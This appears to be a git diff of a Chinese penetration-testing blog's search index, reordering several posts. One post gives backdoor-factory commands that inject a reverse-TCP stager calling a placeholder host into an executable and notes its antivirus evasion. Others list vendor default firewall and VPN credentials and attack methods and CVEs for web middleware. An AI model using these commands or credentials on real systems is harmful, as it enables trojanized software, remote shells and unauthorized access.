-<li>应聘岗位具体职责和工作内容？会不会经常出差？</li>
-<li>试用期多久？薪水多少？</li>
-</ul>
-]]></content>
       <tags>
         <tag>面试</tag>
       </tags>
@@ -2143,21 +2197,6 @@
       </tags>
   </entry>
   <entry>
-    <title>shellcode注入工具—backdoor-factory</title>
-    <url>/2019/09/19/shellcode%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E2%80%94backdoor-factory/</url>
-    <content><![CDATA[<p>backdoor-factory是向正常的elf、exe、dll注入shellcode。之前测试过，免杀效果还可以，但是比较依赖正常的文件</p><a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backdoor.py -f /demo/xxx.exe -S   //检测是否支持后门植入</span><br><span class="line">backdoor.py -f /demo/xxx.exe -c -l 700    //显示出code cave大于700字符大小的code cave</span><br><span class="line">backdoor.py -f /demo/xxx.exe -s show  //查看可用payload</span><br><span class="line">backdoor.py -f /demo/xxx.exe -H x.x.x.x -P 8080 -s iat_reverse_tcp_stager_threaded     //插入payload，并生成文件。</span><br></pre></td></tr></table></figure>
-
-<p>生成好之后可以对比一下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5sum ./guobang.exe /root/demo/guobang.exe  //对比原文件与生成文件MD5值</span><br><span class="line">du -b ./guobang.exe /root/demo/guobang.exe   //对比文件大小</span><br></pre></td></tr></table></figure>
-
-<p>tips:<br>1、backdoor最好是github上下载的，不要aptget</p>
-]]></content>
-      <tags>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vssadmin获取NTDS实操</title>
     <url>/2019/09/19/vssadmin%E8%8E%B7%E5%8F%96NTDS%E5%AE%9E%E6%93%8D/</url>
     <content><![CDATA[<p>把昨天发的vssadmin获取ntds数据库的文章实际操作了一下<br>这里使用的是God.org单域环境(更新1)，我的目的只是实操vssadmin所以不搞的太复杂<br><img src="https://i.loli.net/2019/11/11/gKbpe8clSqTjYZ9.png" alt="Image-1.png"></p><a id="more"></a>
@@ -2196,6 +2235,21 @@
 ]]></content>
       <tags>
         <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shellcode注入工具—backdoor-factory</title>
+    <url>/2019/09/19/shellcode%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E2%80%94backdoor-factory/</url>
+    <content><![CDATA[<p>backdoor-factory是向正常的elf、exe、dll注入shellcode。之前测试过，免杀效果还可以，但是比较依赖正常的文件</p><a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backdoor.py -f /demo/xxx.exe -S   //检测是否支持后门植入</span><br><span class="line">backdoor.py -f /demo/xxx.exe -c -l 700    //显示出code cave大于700字符大小的code cave</span><br><span class="line">backdoor.py -f /demo/xxx.exe -s show  //查看可用payload</span><br><span class="line">backdoor.py -f /demo/xxx.exe -H x.x.x.x -P 8080 -s iat_reverse_tcp_stager_threaded     //插入payload，并生成文件。</span><br></pre></td></tr></table></figure>
+
+<p>生成好之后可以对比一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5sum ./guobang.exe /root/demo/guobang.exe  //对比原文件与生成文件MD5值</span><br><span class="line">du -b ./guobang.exe /root/demo/guobang.exe   //对比文件大小</span><br></pre></td></tr></table></figure>
+
+<p>tips:<br>1、backdoor最好是github上下载的，不要aptget</p>
+]]></content>
+      <tags>
+        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
@@ -2597,6 +2651,14 @@
       </tags>
   </entry>
   <entry>
+    <title>各大厂商设备默认密码</title>
+    <url>/2019/09/15/%E5%90%84%E5%A4%A7%E5%8E%82%E5%95%86%E8%AE%BE%E5%A4%87%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254 用户名:superman 密码:talent 技术支持热线：8008105119</span><br><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254：8080 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存 联想网御防火墙，需要证书（最好用IE浏览器登录）</span><br><span class="line">登录地址:https://10.1.5.254:8889 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666</span><br><span class="line">深信服防火墙（注安全设备管理地址不是唯一的） https://10.251.251.251</span><br><span class="line">https://10.254.254.254 用户名：admin 密码：admin 技术支持热线：4006306430</span><br><span class="line">启明星辰 https://10.1.5.254:8889 用户名：admin 密码：bane@7766</span><br><span class="line">https://10.50.10.45:8889 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900</span><br><span class="line">juniper 登录地址:https://192.168.1.1 用户名:netscreen 密码:netscreen</span><br><span class="line">Cisco 登录地址:https://192.168.0.1 用户名:admin 密码:cisco</span><br><span class="line">Huawei 登录地址:http://192.168.0.1 用户名:admin 密码:Admin@123</span><br><span class="line">H3C 登录地址:http://192.168.0.1 用户名:admin 密码:admin 技术支持热线：4006306430</span><br><span class="line">绿盟IPS https://192.168.1.101 用户名: weboper 密码: weboper 配置重启生效</span><br><span class="line">网神防火墙GE1口 https://10.50.10.45 用户名：admin 密码：firewall 技术支持热线：4006108220</span><br><span class="line">深信服VPN： 51111端口 delanrecover</span><br><span class="line">华为VPN：账号：root 密码：mduadmin</span><br><span class="line">华为防火墙： admin Admin@123 eudemon</span><br><span class="line">eudemon Juniper防火墙： netscreen netscreen</span><br><span class="line">迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)</span><br><span class="line">山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone</span><br><span class="line">安恒的明御防火墙 admin/adminadmin</span><br><span class="line">某堡垒机 shterm/shterm</span><br><span class="line">天融信的vpn test/123456</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>记录</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>后渗透权限维持–SharPersist</title>
     <url>/2019/09/15/%E5%90%8E%E6%B8%97%E9%80%8F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E2%80%93SharPersist/</url>
     <content><![CDATA[<p>我从github上下载下来，放在virscan上和virustotal上查杀了一下，以下为对比信息。</p><a id="more"></a>
@@ -2636,14 +2698,6 @@
 ]]></content>
       <tags>
         <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>各大厂商设备默认密码</title>
-    <url>/2019/09/15/%E5%90%84%E5%A4%A7%E5%8E%82%E5%95%86%E8%AE%BE%E5%A4%87%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/</url>
-    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254 用户名:superman 密码:talent 技术支持热线：8008105119</span><br><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254：8080 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存 联想网御防火墙，需要证书（最好用IE浏览器登录）</span><br><span class="line">登录地址:https://10.1.5.254:8889 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666</span><br><span class="line">深信服防火墙（注安全设备管理地址不是唯一的） https://10.251.251.251</span><br><span class="line">https://10.254.254.254 用户名：admin 密码：admin 技术支持热线：4006306430</span><br><span class="line">启明星辰 https://10.1.5.254:8889 用户名：admin 密码：bane@7766</span><br><span class="line">https://10.50.10.45:8889 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900</span><br><span class="line">juniper 登录地址:https://192.168.1.1 用户名:netscreen 密码:netscreen</span><br><span class="line">Cisco 登录地址:https://192.168.0.1 用户名:admin 密码:cisco</span><br><span class="line">Huawei 登录地址:http://192.168.0.1 用户名:admin 密码:Admin@123</span><br><span class="line">H3C 登录地址:http://192.168.0.1 用户名:admin 密码:admin 技术支持热线：4006306430</span><br><span class="line">绿盟IPS https://192.168.1.101 用户名: weboper 密码: weboper 配置重启生效</span><br><span class="line">网神防火墙GE1口 https://10.50.10.45 用户名：admin 密码：firewall 技术支持热线：4006108220</span><br><span class="line">深信服VPN： 51111端口 delanrecover</span><br><span class="line">华为VPN：账号：root 密码：mduadmin</span><br><span class="line">华为防火墙： admin Admin@123 eudemon</span><br><span class="line">eudemon Juniper防火墙： netscreen netscreen</span><br><span class="line">迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)</span><br><span class="line">山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone</span><br><span class="line">安恒的明御防火墙 admin/adminadmin</span><br><span class="line">某堡垒机 shterm/shterm</span><br><span class="line">天融信的vpn test/123456</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>记录</tag>
       </tags>
   </entry>
   <entry>
@@ -2913,6 +2967,47 @@
       </tags>
   </entry>
   <entry>
+    <title>（一）渗透技巧—web</title>
+    <url>/2019/04/15/%EF%BC%88%E4%B8%80%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94web/</url>
+    <content><![CDATA[<blockquote>
+<p>文章不记得从哪个公众号上拉下来的了</p>
+</blockquote><a id="more"></a>
+<h2 id="1、自定义-Web-应用"><a href="#1、自定义-Web-应用" class="headerlink" title="1、自定义 Web 应用"></a>1、自定义 Web 应用</h2><p>从公网直接攻击目标对外的 Web 应用，或者在授权的情况下在内网进行渗透测试，如果是入侵目的可以直接寻找注入、上传、代码执行、文件包含等高危漏洞，尝试获取系统权限，或者直接能拿到敏感数据。<br>允许扫描的话一般使用 WVS 直接扫描，也可以使用专门扫描特定漏洞的扫描工具如 sqlmap、XSStrike 等工具扫描特定类型的漏洞。不允许直接扫描，使用 Burp 手工慢慢找了。</p>
+<h2 id="2、Web-中间件"><a href="#2、Web-中间件" class="headerlink" title="2、Web 中间件"></a>2、Web 中间件</h2><h3 id="（1）Tomcat"><a href="#（1）Tomcat" class="headerlink" title="（1）Tomcat"></a>（1）Tomcat</h3><p>Tomcat是Apache Jakarta软件组织的一个子项目，Tomcat是一个JSP/Servlet容器，它是在SUN公司的JSWDK（Java Server Web Development Kit）基础上发展起来的一个JSP和Servlet规范的标准实现，使用Tomcat可以体验JSP和Servlet的最新规范。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口号：8080</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。</span><br><span class="line">•   在管理后台部署 war 后门文件</span><br><span class="line">•   远程代码执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://paper.seebug.org/399/</span><br><span class="line">http://www.freebuf.com/column/159200.html</span><br><span class="line">http://liehu.tass.com.cn/archives/836</span><br><span class="line">http://www.mottoin.com/87173.html</span><br></pre></td></tr></table></figure>
+<h3 id="（2）Jboss"><a href="#（2）Jboss" class="headerlink" title="（2）Jboss"></a>（2）Jboss</h3><p>是一个运行EJB的J2EE应用服务器。它是开放源代码的项目，遵循最新的J2EE规范。从JBoss项目开始至今，它已经从一个EJB容器发展成为一个基于的 J2EE 的一个Web 操作系统（operating system for web），它体现了 J2EE 规范中最新的技术。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：8080</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   弱口令，爆破</span><br><span class="line">•   管理后台部署 war 后门</span><br><span class="line">•   反序列化</span><br><span class="line">•   远程代码执行</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.vuln.cn/6300</span><br><span class="line"></span><br><span class="line">http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html</span><br><span class="line"></span><br><span class="line">https://www.zybuluo.com/websec007/note/838374</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/u011215939/article/details/79141624</span><br></pre></td></tr></table></figure>
+<h3 id="（3）WebLogic"><a href="#（3）WebLogic" class="headerlink" title="（3）WebLogic"></a>（3）WebLogic</h3><p>WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：7001，7002</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic</span><br><span class="line">•   管理后台部署 war 后门</span><br><span class="line">•   SSRF</span><br><span class="line">•   反序列化漏洞</span><br><span class="line">•   weblogic_uac</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</span><br><span class="line"></span><br><span class="line">https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</span><br><span class="line"></span><br><span class="line">https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/</span><br><span class="line"></span><br><span class="line">https://bbs.pediy.com/thread-224954.htm</span><br></pre></td></tr></table></figure>
+<h3 id="4）WebSphere"><a href="#4）WebSphere" class="headerlink" title="4）WebSphere"></a>4）WebSphere</h3><p>IBM公司一套典型的电子商务应用开发工具及运行环境。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   控制台登录爆破</span><br><span class="line">•   很多内网 websphere 的控制台存在弱口令 / 默认口令，可以使用 admin/admin 以及 webshpere/webshpere 这种口令登录。 通过该口令登录控制台后，可以部署 war 包，从而获取到 WEBSHELL 。</span><br><span class="line">•   反序列化</span><br><span class="line">•   任意文件泄露</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=WebSphere&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">http://www.fr1sh.com/wooyun_1/bug_detail.php?wybug_id=wooyun-2013-036803</span><br><span class="line"></span><br><span class="line">https://gist.github.com/metall0id/bb3e9bab2b7caee90cb7</span><br></pre></td></tr></table></figure>
+<h2 id="3、Web-框架"><a href="#3、Web-框架" class="headerlink" title="3、Web 框架"></a>3、Web 框架</h2><h3 id="（1）Struts2"><a href="#（1）Struts2" class="headerlink" title="（1）Struts2"></a>（1）Struts2</h3><p>Struts2是一个优雅的,可扩展的框架,用于创建企业准备的Java Web应用程序。出现的漏洞也着实的多每爆一个各大漏洞平台上就会被刷屏。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line"></span><br><span class="line">•   S2-046 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</span><br><span class="line">•   S2-045 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</span><br><span class="line">•   S2-037 CVE-2016-4438 Struts 2.3.20-2.3.28.1</span><br><span class="line">•   S2-032 CVE-2016-3081 Struts 2.3.18-2.3.28</span><br><span class="line">•   S2-020 CVE-2014-0094 Struts 2.0.0-2.3.16</span><br><span class="line">•   S2-019 CVE-2013-4316 Struts 2.0.0-2.3.15.1</span><br><span class="line">•   S2-016 CVE-2013-2251 Struts 2.0.0-2.3.15</span><br><span class="line">•   S2-013 CVE-2013-1966 Struts 2.0.0-2.3.14</span><br><span class="line">•   S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1</span><br><span class="line">•   S2-005 CVE-2010-1870 Struts 2.0.0-2.1.8.1</span><br><span class="line">参考：</span><br><span class="line">https://github.com/hktalent/myhktools</span><br><span class="line"></span><br><span class="line">https://github.com/Lucifer1993/struts-scan</span><br><span class="line"></span><br><span class="line">https://github.com/SecureSkyTechnology/study-struts2-s2-054_055-jackson-cve-2017-7525_cve-2017-15095</span><br></pre></td></tr></table></figure>
+<h3 id="（2）Spring-框架"><a href="#（2）Spring-框架" class="headerlink" title="（2）Spring 框架"></a>（2）Spring 框架</h3><p>Spring Framework 是一个开源的Java／Java EE全功能栈（full-stack）的应用程序框架，以Apache License 2.0开源许可协议的形式发布，也有.NET平台上的移植版本。Spring Framework提供了一个简易的开发方式，这种开发方式，将避免那些可能致使底层代码变得繁杂混乱的大量的属性文件和帮助类。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   CVE-2010-1622</span><br><span class="line">•   CVE-2018-1274</span><br><span class="line">•   CVE-2018-1270</span><br><span class="line">•   CVE-2018-1273</span><br><span class="line">•   反序列化</span><br><span class="line">•   目录穿越</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.inbreak.net/archives/377</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/71762.html</span><br><span class="line"></span><br><span class="line">http://www.open-open.com/news/view/1225d07</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/2261</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/2252</span><br></pre></td></tr></table></figure>
+<h2 id="4、Web-服务器"><a href="#4、Web-服务器" class="headerlink" title="4、Web 服务器"></a>4、Web 服务器</h2><h3 id="IIS：Windows-的-WWW-服务器"><a href="#IIS：Windows-的-WWW-服务器" class="headerlink" title="IIS：Windows 的 WWW 服务器"></a>IIS：Windows 的 WWW 服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   https://masterxsec.github.io/2017/06/07/IIS-write-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</span><br><span class="line">•   http://www.freebuf.com/articles/4908.html</span><br><span class="line">•   https://www.anquanke.com/post/id/85811</span><br><span class="line">•   IIS，开启了 WebDAV，可以直接详服务器 PUT 文件</span><br><span class="line">•   短文件名枚举漏洞</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   提权漏洞</span><br><span class="line">•   解析漏洞</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
+<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   解析漏洞</span><br><span class="line">•   目录遍历</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
+<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   https://www.seebug.org/vuldb/ssvid-92538</span><br><span class="line">•   解析漏洞</span><br><span class="line">•   目录遍历</span><br><span class="line">•   CVE-2016-1247：需要获取主机操作权限，攻击者可通过软链接任意文件来替换日志文件，从而实现提权以获取服务器的root权限。</span><br><span class="line">•   端口：80</span><br><span class="line">lighttpd</span><br><span class="line"></span><br><span class="line">•   目录遍历</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>记录</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>（三）渗透技巧—数据库、缓存、消息服务</title>
     <url>/2019/04/15/%EF%BC%88%E4%B8%89%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81%E7%BC%93%E5%AD%98%E3%80%81%E6%B6%88%E6%81%AF%E6%9C%8D%E5%8A%A1/</url>
     <content><![CDATA[<blockquote>
@@ -2968,72 +3063,32 @@
       </tags>
   </entry>
   <entry>
-    <title>（一）渗透技巧—web</title>
-    <url>/2019/04/15/%EF%BC%88%E4%B8%80%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94web/</url>
+    <title>（二）渗透技巧—常见运维系统</title>
+    <url>/2019/04/15/%EF%BC%88%E4%BA%8C%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%B8%B8%E8%A7%81%E8%BF%90%E7%BB%B4%E7%B3%BB%E7%BB%9F/</url>
     <content><![CDATA[<blockquote>
 <p>文章不记得从哪个公众号上拉下来的了</p>
 </blockquote><a id="more"></a>
-<h2 id="1、自定义-Web-应用"><a href="#1、自定义-Web-应用" class="headerlink" title="1、自定义 Web 应用"></a>1、自定义 Web 应用</h2><p>从公网直接攻击目标对外的 Web 应用，或者在授权的情况下在内网进行渗透测试，如果是入侵目的可以直接寻找注入、上传、代码执行、文件包含等高危漏洞，尝试获取系统权限，或者直接能拿到敏感数据。<br>允许扫描的话一般使用 WVS 直接扫描，也可以使用专门扫描特定漏洞的扫描工具如 sqlmap、XSStrike 等工具扫描特定类型的漏洞。不允许直接扫描，使用 Burp 手工慢慢找了。</p>
-<h2 id="2、Web-中间件"><a href="#2、Web-中间件" class="headerlink" title="2、Web 中间件"></a>2、Web 中间件</h2><h3 id="（1）Tomcat"><a href="#（1）Tomcat" class="headerlink" title="（1）Tomcat"></a>（1）Tomcat</h3><p>Tomcat是Apache Jakarta软件组织的一个子项目，Tomcat是一个JSP/Servlet容器，它是在SUN公司的JSWDK（Java Server Web Development Kit）基础上发展起来的一个JSP和Servlet规范的标准实现，使用Tomcat可以体验JSP和Servlet的最新规范。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口号：8080</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。</span><br><span class="line">•   在管理后台部署 war 后门文件</span><br><span class="line">•   远程代码执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://paper.seebug.org/399/</span><br><span class="line">http://www.freebuf.com/column/159200.html</span><br><span class="line">http://liehu.tass.com.cn/archives/836</span><br><span class="line">http://www.mottoin.com/87173.html</span><br></pre></td></tr></table></figure>
-<h3 id="（2）Jboss"><a href="#（2）Jboss" class="headerlink" title="（2）Jboss"></a>（2）Jboss</h3><p>是一个运行EJB的J2EE应用服务器。它是开放源代码的项目，遵循最新的J2EE规范。从JBoss项目开始至今，它已经从一个EJB容器发展成为一个基于的 J2EE 的一个Web 操作系统（operating system for web），它体现了 J2EE 规范中最新的技术。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：8080</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   弱口令，爆破</span><br><span class="line">•   管理后台部署 war 后门</span><br><span class="line">•   反序列化</span><br><span class="line">•   远程代码执行</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.vuln.cn/6300</span><br><span class="line"></span><br><span class="line">http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html</span><br><span class="line"></span><br><span class="line">https://www.zybuluo.com/websec007/note/838374</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/u011215939/article/details/79141624</span><br></pre></td></tr></table></figure>
-<h3 id="（3）WebLogic"><a href="#（3）WebLogic" class="headerlink" title="（3）WebLogic"></a>（3）WebLogic</h3><p>WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：7001，7002</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic</span><br><span class="line">•   管理后台部署 war 后门</span><br><span class="line">•   SSRF</span><br><span class="line">•   反序列化漏洞</span><br><span class="line">•   weblogic_uac</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</span><br><span class="line"></span><br><span class="line">https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</span><br><span class="line"></span><br><span class="line">https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/</span><br><span class="line"></span><br><span class="line">https://bbs.pediy.com/thread-224954.htm</span><br></pre></td></tr></table></figure>
-<h3 id="4）WebSphere"><a href="#4）WebSphere" class="headerlink" title="4）WebSphere"></a>4）WebSphere</h3><p>IBM公司一套典型的电子商务应用开发工具及运行环境。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   控制台登录爆破</span><br><span class="line">•   很多内网 websphere 的控制台存在弱口令 / 默认口令，可以使用 admin/admin 以及 webshpere/webshpere 这种口令登录。 通过该口令登录控制台后，可以部署 war 包，从而获取到 WEBSHELL 。</span><br><span class="line">•   反序列化</span><br><span class="line">•   任意文件泄露</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=WebSphere&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">http://www.fr1sh.com/wooyun_1/bug_detail.php?wybug_id=wooyun-2013-036803</span><br><span class="line"></span><br><span class="line">https://gist.github.com/metall0id/bb3e9bab2b7caee90cb7</span><br></pre></td></tr></table></figure>
-<h2 id="3、Web-框架"><a href="#3、Web-框架" class="headerlink" title="3、Web 框架"></a>3、Web 框架</h2><h3 id="（1）Struts2"><a href="#（1）Struts2" class="headerlink" title="（1）Struts2"></a>（1）Struts2</h3><p>Struts2是一个优雅的,可扩展的框架,用于创建企业准备的Java Web应用程序。出现的漏洞也着实的多每爆一个各大漏洞平台上就会被刷屏。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line"></span><br><span class="line">•   S2-046 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</span><br><span class="line">•   S2-045 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</span><br><span class="line">•   S2-037 CVE-2016-4438 Struts 2.3.20-2.3.28.1</span><br><span class="line">•   S2-032 CVE-2016-3081 Struts 2.3.18-2.3.28</span><br><span class="line">•   S2-020 CVE-2014-0094 Struts 2.0.0-2.3.16</span><br><span class="line">•   S2-019 CVE-2013-4316 Struts 2.0.0-2.3.15.1</span><br><span class="line">•   S2-016 CVE-2013-2251 Struts 2.0.0-2.3.15</span><br><span class="line">•   S2-013 CVE-2013-1966 Struts 2.0.0-2.3.14</span><br><span class="line">•   S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1</span><br><span class="line">•   S2-005 CVE-2010-1870 Struts 2.0.0-2.1.8.1</span><br><span class="line">参考：</span><br><span class="line">https://github.com/hktalent/myhktools</span><br><span class="line"></span><br><span class="line">https://github.com/Lucifer1993/struts-scan</span><br><span class="line"></span><br><span class="line">https://github.com/SecureSkyTechnology/study-struts2-s2-054_055-jackson-cve-2017-7525_cve-2017-15095</span><br></pre></td></tr></table></figure>
-<h3 id="（2）Spring-框架"><a href="#（2）Spring-框架" class="headerlink" title="（2）Spring 框架"></a>（2）Spring 框架</h3><p>Spring Framework 是一个开源的Java／Java EE全功能栈（full-stack）的应用程序框架，以Apache License 2.0开源许可协议的形式发布，也有.NET平台上的移植版本。Spring Framework提供了一个简易的开发方式，这种开发方式，将避免那些可能致使底层代码变得繁杂混乱的大量的属性文件和帮助类。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   CVE-2010-1622</span><br><span class="line">•   CVE-2018-1274</span><br><span class="line">•   CVE-2018-1270</span><br><span class="line">•   CVE-2018-1273</span><br><span class="line">•   反序列化</span><br><span class="line">•   目录穿越</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.inbreak.net/archives/377</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/71762.html</span><br><span class="line"></span><br><span class="line">http://www.open-open.com/news/view/1225d07</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/2261</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/2252</span><br></pre></td></tr></table></figure>
-<h2 id="4、Web-服务器"><a href="#4、Web-服务器" class="headerlink" title="4、Web 服务器"></a>4、Web 服务器</h2><h3 id="IIS：Windows-的-WWW-服务器"><a href="#IIS：Windows-的-WWW-服务器" class="headerlink" title="IIS：Windows 的 WWW 服务器"></a>IIS：Windows 的 WWW 服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   https://masterxsec.github.io/2017/06/07/IIS-write-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</span><br><span class="line">•   http://www.freebuf.com/articles/4908.html</span><br><span class="line">•   https://www.anquanke.com/post/id/85811</span><br><span class="line">•   IIS，开启了 WebDAV，可以直接详服务器 PUT 文件</span><br><span class="line">•   短文件名枚举漏洞</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   提权漏洞</span><br><span class="line">•   解析漏洞</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
